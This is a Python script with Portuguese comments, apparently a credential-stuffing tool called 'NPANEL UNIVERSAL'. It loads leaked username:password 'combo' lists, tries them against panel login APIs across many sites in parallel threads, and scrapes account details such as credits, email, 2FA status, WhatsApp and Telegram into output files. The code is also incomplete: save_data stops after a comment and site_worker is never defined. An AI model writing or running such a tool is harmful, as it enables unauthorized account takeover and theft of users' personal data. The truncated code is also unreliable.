import os
import sys
import threading
import queue
import requests
import re
import time
import logging
from configparser import ConfigParser
from colorama import Fore
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3.exceptions import InsecureRequestWarning

# Carregar configurações do arquivo .ini
config = ConfigParser()
config.read('config.ini')

# Configurações globais
combo_dir = config.get('General', 'combo_dir')
site_file = config.get('General', 'site_file')
output_dir = config.get('General', 'output_dir')
THREADS_PER_SITE = config.getint('General', 'threads_per_site')
PROCESSES_PER_SITE = config.getint('General', 'processes_per_site')
RETRIES = config.getint('General', 'retries')
DELAY = config.getint('General', 'delay')

# Configuração para evitar warnings de SSL
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS = "TLS_AES_128_GCM_SHA256:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256:TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256:TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384:TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA:TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_AES_128_GCM_SHA256:TLS_RSA_WITH_AES_256_GCM_SHA384:TLS_RSA_WITH_AES_128_CBC_SHA:TLS_RSA_WITH_AES_256_CBC_SHA:TLS_RSA_WITH_3DES_EDE_CBC_SHA:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256:TLS13-AES-256-GCM-SHA384:ECDHE:!COMP:TLS13-AES-256-GCM-SHA384:TLS13-CHACHA20-POLY1305-SHA256:TLS13-AES-128-GCM-SHA256"
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
logging.captureWarnings(True)

NOME = 'NPANEL UNIVERSAL'
if sys.platform.startswith('win'):
    import ctypes
    ctypes.windll.kernel32.SetConsoleTitleW(NOME)
else:
    sys.stdout.write(f'\033]2;{NOME}\007')

ascii_art = """\033[93m
noneee
"""

def get_first_combo_file():
    try:
        combo_files = [f for f in os.listdir(combo_dir) if os.path.isfile(os.path.join(combo_dir, f))]
        if combo_files:
            return os.path.join(combo_dir, combo_files[0])
        return None
    except FileNotFoundError:
        print(f"{Fore.RED}Diretório de combo não encontrado!")
        return None

def read_sites():
    try:
        with open(site_file, "r") as f:
            return [site.strip() for site in f.readlines() if site.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}Arquivo site.txt não encontrado!")
        return []

def handle_connection_error(func, *args, retries=RETRIES, delay=DELAY, **kwargs):
    for attempt in range(retries):
        try:
            return func(*args, **kwargs)
        except (requests.ConnectionError, requests.Timeout) as e:
            print(f"{Fore.RED}Erro de conexão: {e}. Tentativa {attempt + 1} de {retries}...")
            time.sleep(delay)
    return None

def login(nhost, user, password):
    url = f"https://{nhost}/sys/api.php"
    payload = {
        "action": "login",
        "username": user,
        "password": password
    }
    response = handle_connection_error(requests.post, url, data=payload)
    
    if response and response.ok and "success\":true" in response.text:
        cookies = response.cookies.get("PHPSESSID")
        return cookies
    return None

def get_dashboard_data(nhost, cookies):
    url = f"https://{nhost}/dashboard"
    response = handle_connection_error(requests.get, url, cookies={"PHPSESSID": cookies})
    return response.text if response else None

def get_profile_data(nhost, cookies):
    url = f"https://{nhost}/profile"
    response = handle_connection_error(requests.get, url, cookies={"PHPSESSID": cookies})
    return response.text if response else None

def save_data(nhost, user, password, credits, email, registration_date, twofa, whatsapp, telegram):
    base_path = output_dir
    os.makedirs(base_path, exist_ok=True)

    file_path = f"{base_path}/Sr.Hell@{nhost}.txt"
    combo_path = f"{base_path}/Sr.Hell@COMBO(U&P).txt"

    # Verificar e remover duplicatas
def manage_sites(sites, combos_data):
    site_queue = queue.Queue()
    for site in sites:
        site_queue.put(site)
    site_threads = []
    with ThreadPoolExecutor(max_workers=PROCESSES_PER_SITE) as executor:
        futures = [executor.submit(site_worker, site_queue, combos_data) for _ in range(PROCESSES_PER_SITE)]
        for future in as_completed(futures):
            future.result()

def main():
    print(ascii_art)    
    sites = read_sites()
    if not sites:
        print(f"{Fore.RED}Nenhum site encontrado para verificar!")
        return
    combo_file = get_first_combo_file()
    if not combo_file:
        print(f"{Fore.RED}Nenhum arquivo de combo encontrado!")
        return
    print(f"{Fore.CYAN}Usando arquivo de combo: {os.path.basename(combo_file)}")
    print(f"{Fore.CYAN}Sites a serem verificados: {len(sites)}")

    print(f"{Fore.CYAN}Threads por site: {THREADS_PER_SITE}")
    print(f"{Fore.CYAN}Sites simultâneos: {PROCESSES_PER_SITE}")
    
    try:
        with open(combo_file, "r") as f:
            combos_data = f.readlines()
        print(f"{Fore.CYAN}Combos carregados: {len(combos_data)}")
        
        manage_sites(sites, combos_data)
    except Exception as e:
        print(f"{Fore.RED}Erro ao processar o arquivo de combo: {str(e)}")

if __name__ == "__main__":
    main()    
